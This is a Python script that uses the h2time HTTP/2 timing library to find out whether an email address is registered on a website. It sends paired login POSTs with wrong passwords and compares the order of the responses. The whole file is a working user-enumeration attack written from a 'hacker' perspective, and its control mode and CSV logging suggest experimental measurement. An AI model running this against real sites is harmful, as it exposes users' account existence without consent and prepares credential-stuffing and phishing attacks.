from h2time import H2Time, H2Request
import asyncio
import random
import string
import os
import sys


async def attack():
    detail_file = open("results/" + sys.argv[4] + "_" + sys.argv[5] + "_detail.csv", "a")
    winners_file = open("results/" + sys.argv[4] + "_" + sys.argv[5] + "_winners.csv", "a")

    # This must be the email that you as the hacker want to test if exists on the site
    if sys.argv[5] == "control":
        post_data = 'password=12345789abc&email=' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '@ephort.dk'
    else:
        post_data = 'password=12345789abc&email=' + sys.argv[3]


    # This has to be the email known by the hacker to be existing on the site. But the password must be wrong.
    post_data2 = 'password=12345789abc&email=' + sys.argv[2]
    
    
    r1 = H2Request('POST', sys.argv[1], {'content-length': str(len(post_data)),
                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data)
    r2 = H2Request('POST', sys.argv[1], {'content-length': str(len(post_data2)),
                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data2)
    
    num_request_pairs = 5
    
    safety_margin = num_request_pairs / 5
    
    async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10) as h2t:
        results = await h2t.run_attack()
        output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
        num = output.count('-')
    # print(output)
    # print((num / num_request_pairs) * 100)
    if ((num - (num_request_pairs/2)) > safety_margin):
        #print("Request 1 is likely winner (response received last from server in %s of the request pairs)" % (num))
        # print(post_data)
        winner = "1"
    elif ((num - (num_request_pairs/2)) < -safety_margin):
        #print("Request 2 is likely winner (response received last from server in %s of the request pairs)" % (num_request_pairs-num))
        winner = "2"
    else:      
        winner = "0"
        #print("Could not determine winner. Even distributed with %s responses that came in with response 1 last" % (num))

    # print(winner)

    detail_file.write(output + "\n")
    winners_file.write(winner + "\n")

    detail_file.close()
    winners_file.close()

loop = asyncio.get_event_loop()
loop.run_until_complete(attack())
loop.close()
